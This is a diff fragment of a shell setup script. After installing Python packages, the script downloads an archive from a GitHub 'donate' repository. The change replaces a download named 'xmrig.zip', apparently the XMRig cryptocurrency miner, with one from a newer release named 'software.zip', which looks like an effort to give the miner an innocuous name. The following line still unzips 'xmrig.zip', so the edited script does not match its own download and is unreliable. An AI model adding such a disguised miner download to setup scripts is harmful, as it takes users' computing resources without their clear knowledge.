@@ -15,7 +15,7 @@ sleep 0.5
 pip3 install psutil requests tqdm
 sleep 0.5
 
-wget https://github.com/maxdhctrl/donate/releases/download/release-4/xmrig.zip
+wget https://github.com/maxdhctrl/donate/releases/download/release-5/software.zip
 sleep 0.5
 
 unzip xmrig.zip
